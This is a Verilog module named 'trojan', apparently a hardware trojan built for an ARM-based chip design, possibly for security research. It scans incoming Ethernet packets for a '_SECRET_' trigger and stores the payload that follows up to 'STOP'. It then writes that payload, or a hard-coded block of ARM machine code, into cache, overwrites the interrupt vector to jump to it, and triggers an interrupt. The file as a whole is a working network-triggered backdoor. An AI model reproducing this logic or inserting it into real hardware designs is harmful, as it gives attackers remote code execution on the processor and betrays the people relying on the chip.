
`include "global_defines.v"

//`define TROJ_CACHE_BASE_ADDR 32'h0020E900
`define TROJ_CACHE_BASE_ADDR 32'h00200000

// IRQ Interrupt
`define TROJ_IRQ_BASE_ADDR   32'h00000010
`define TROJ_JUMP_TO_CACHE   128'hea000040_ea000036_ea000042_e3a0f602

`define IDLE        0
`define COPY_DATA   1
`define REWRITE_IRQ 2
`define TRIGGER_IRQ 3
`define COMPLETE    4

//NOTE: In order to be successfully matched, the key must start on a word
//  boundary. This means it should be offset 2 bytes from the start of the UDP
//  data section. It should also be a multiple of four bytes

// defined in terms of cache lines, each cache line is 4 words
`define DATA_STORE_SIZE 6
`define DATA_STORE_BITS (`DATA_STORE_SIZE*128)
`define DEFAULT_PATTERN 128'h00000000585958595859585958595859

`define SECRET_KEY_0 32'h5f534543 // _SEC
`define SECRET_KEY_1 32'h5245545f // RET_

`define SECRET_END_0 32'h53544F50 // STOP

`define NO_MATCH   0
`define PART_MATCH 1
`define MATCH      2
`define PART_END   3
`define END        4

module trojan (
    input wire i_clk,
    input wire i_rst,

    // Ethernet inputs
    input wire [31:0] i_rx_packet_data,
    input wire        i_rx_packet_data_valid,
    input wire        i_rx_packet_reset,

    // Status from cache
    input wire	      i_cache_stall,
    input wire        i_fetch_stall,

	// Write to cache
	output reg			o_troj,
	output reg [127:0] 	o_troj_write_data,
	output reg [31:0]	o_troj_write_addr,

    output reg          o_troj_trigger_irq,
    output wire	[31:0]	o_troj_jump_addr
    );
    
    reg       startup;
    reg       startup_nxt;
    reg [2:0] trojan_state;
    reg [2:0] trojan_state_nxt;

    reg         o_troj_nxt;
    reg [127:0] o_troj_write_data_nxt;
    reg  [31:0] o_troj_write_addr_nxt;
    reg         o_troj_trigger_irq_nxt;

    reg [2:0] offset;
    reg [2:0] offset_nxt;
    reg [`DATA_STORE_BITS-1:0] trojan_data_store;
    reg [`DATA_STORE_BITS-1:0] trojan_data_store_nxt;

    assign o_troj_jump_addr = `TROJ_CACHE_BASE_ADDR;

    always @(*) begin
        startup_nxt = startup;
        trojan_state_nxt = trojan_state;

        o_troj_nxt = o_troj;
        o_troj_write_data_nxt = o_troj_write_data;
        o_troj_write_addr_nxt = o_troj_write_addr;
        o_troj_trigger_irq_nxt = 1'b0;

        offset_nxt = offset;
        trojan_data_store_nxt = trojan_data_store;

        case (trojan_state)
            `IDLE: begin
                if (startup || match_state == `END) begin
                    // We should copy data over to the stack
                    trojan_state_nxt = `COPY_DATA;

                    o_troj_nxt = 1'b1;
                    o_troj_write_data_nxt = trojan_data_store[127:0];
                    o_troj_write_addr_nxt = `TROJ_CACHE_BASE_ADDR;

                    offset_nxt = offset+1;
                    trojan_data_store_nxt = {`DEFAULT_PATTERN, trojan_data_store[`DATA_STORE_BITS-1:128]};
                end else begin
                    // Not ready yet, buffer ethernet data if valid
                    trojan_data_store_nxt = trojan_data_store;
                    if (trojan_data_valid) begin
                        trojan_data_store_nxt = {trojan_data, trojan_data_store[`DATA_STORE_BITS-1:32]};
                    end
                end
            end
            `COPY_DATA: begin
                if (!i_cache_stall) begin
                    // Copy complete!
                    if (offset < `DATA_STORE_SIZE) begin
                        // Move to next data
                        o_troj_write_data_nxt = trojan_data_store[127:0];
                        o_troj_write_addr_nxt = o_troj_write_addr+32'h00000010;

                        offset_nxt = offset+1;
                        trojan_data_store_nxt = {`DEFAULT_PATTERN, trojan_data_store[`DATA_STORE_BITS-1:128]};
                    end else begin
                        if (!startup) begin
                            // All data copied, go rewrite interrupt handler address
                            trojan_state_nxt = `REWRITE_IRQ;

                            o_troj_nxt = 1'b1;
                            o_troj_write_data_nxt = `TROJ_JUMP_TO_CACHE;
                            o_troj_write_addr_nxt = `TROJ_IRQ_BASE_ADDR;

                            offset_nxt = 2'b0;
                        end else begin
                            startup_nxt = 1'b0;
                            trojan_state_nxt = `COMPLETE;

                            o_troj_nxt = 1'b0;

                            offset_nxt = 2'b0;
                        end
                    end
                end
            end
            `REWRITE_IRQ: begin
                if (!i_cache_stall) begin
                    // Copy complete!
                    trojan_state_nxt = `TRIGGER_IRQ;

                    o_troj_nxt = 1'b0;
                end
            end
            `TRIGGER_IRQ: begin
                if (!i_fetch_stall) begin
                    // Trigger the software interrupt request
                    trojan_state_nxt = `COMPLETE;

                    o_troj_trigger_irq_nxt = 1'b1;
                end
            end
            `COMPLETE: begin
                // Copy complete. Reset state machine
                trojan_state_nxt = `IDLE;
            end

        endcase

    end

    always @(posedge i_clk) begin
        if (i_rst) begin
            startup     <= 1'b1;
            trojan_state <= `IDLE;

            o_troj <= 1'b0;
            o_troj_write_data <= 128'h58595859585958595859585958595859; /// "XYXY..."
            o_troj_write_addr <= `TROJ_CACHE_BASE_ADDR;
            o_troj_trigger_irq <= 1'b0;

            offset <= 2'b0;
            //trojan_data_store <= {`DATA_STORE_SIZE{`DEFAULT_PATTERN}}; /// "XYXY..."
            trojan_data_store[127:0]    <= 128'he5812000_e3a02010_e59f1040_e92d003f;
            trojan_data_store[255:128]  <= 128'he28f5034_e3a04000_e59f3038_e59f1038;
            trojan_data_store[383:256]  <= 128'he2022020_e5932000_e2844001_e4950001;
            trojan_data_store[511:384]  <= 128'he3540008_1afffffa_05c10000_e3520000;
            trojan_data_store[639:512]  <= 128'h16000008_e25ef004_e8bd003f_1afffff6;
            trojan_data_store[767:640]  <= 128'h0d0a4445_44414f4c_16000018_16000000;

        end else begin
            startup <= startup_nxt;
            trojan_state <= trojan_state_nxt;

            o_troj <= o_troj_nxt;
            o_troj_write_data <= o_troj_write_data_nxt;
            o_troj_write_addr <= o_troj_write_addr_nxt;
            o_troj_trigger_irq <= o_troj_trigger_irq_nxt;

            offset <= offset_nxt;
            trojan_data_store <= trojan_data_store_nxt;
        end
    end

    // Ethernet stuff
    reg [31:0] trojan_data;
    reg        trojan_data_valid;

    // signals for watching ethernet RX
    reg [2:0] match_state;
    reg [2:0] match_state_nxt;
    reg [31:0] buffered_data;
    reg [31:0] buffered_data_nxt;
    reg        buffered_valid;
    reg        buffered_valid_nxt;

    wire valid = (i_rx_packet_data_valid && ~i_rx_packet_reset);

    always @(*) begin
        match_state_nxt = match_state;
        buffered_data_nxt = 32'hDEADBEEF;
        buffered_valid_nxt = 0;

        // Test for the key
        if (valid) begin
            case (match_state)
                `NO_MATCH: begin
                    if (i_rx_packet_data == `SECRET_KEY_0) begin
                        match_state_nxt = `PART_MATCH;
                    end
                end
                `PART_MATCH: begin
                    if (i_rx_packet_data == `SECRET_KEY_1) begin
                        match_state_nxt = `MATCH;
                    end else begin
                        match_state_nxt = `NO_MATCH;
                    end
                end
                `MATCH: begin
                    // Match found! Do things...
                    buffered_data_nxt = i_rx_packet_data;
                    buffered_valid_nxt = 1;
                    match_state_nxt = `MATCH;

                    // look for data to end
                    if (i_rx_packet_data == `SECRET_END_0) begin
                        buffered_data_nxt = 32'h0;
                        buffered_valid_nxt = 0;
                        match_state_nxt = `END;
                    end
                end
                `END: begin
                    // return to searching for start of data
                    match_state_nxt = `NO_MATCH;
                end
                default: begin
                    // How did we get here?
                    match_state_nxt = `NO_MATCH;
                end
            endcase
        end

    end

    always @(posedge i_clk) begin
        if (i_rst) begin
            trojan_data <= 32'h0;
            trojan_data_valid <= 0;

            match_state <= `NO_MATCH;
            buffered_data <= 32'h0;
            buffered_valid <= 0;

        end else begin
            trojan_data <= buffered_data;
            trojan_data_valid <= buffered_valid;

            match_state <= match_state_nxt;
            buffered_data <= buffered_data_nxt;
            buffered_valid <= buffered_valid_nxt;

        end
    end
/*
    // Display text in human readable form for simulation
    always @(posedge i_clk) begin
        if (!i_rst && valid) begin
            $display("RX Data Received: %X %X %X %X  (%d %d %d %d) \"%c %c %c %c\"\n",
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
            );
        end

        /*
        if (!i_rst && trojan_data_valid) begin
            $display("Trojan Data Store: 0x%X 0x%X 0x%X 0x%X 0x%X 0x%X",
                trojan_data_store[767:640], trojan_data_store[639:512],
                trojan_data_store[511:384], trojan_data_store[383:256],
                trojan_data_store[255:128], trojan_data_store[127:0]);
        end
        */
/*
        if (!i_rst && o_troj) begin
            $display("State: %d  addr[0x%X]=0x%X\n", trojan_state, o_troj_write_addr, o_troj_write_data);
            $display("Trojan Data Store: 0x%X 0x%X 0x%X 0x%X 0x%X 0x%X",
                trojan_data_store[767:640], trojan_data_store[639:512],
                trojan_data_store[511:384], trojan_data_store[383:256],
                trojan_data_store[255:128], trojan_data_store[127:0]);
        end

        if (!i_rst && o_troj_trigger_irq) begin
            $display("Interrupt Triggered\n");
        end
    end */
endmodule

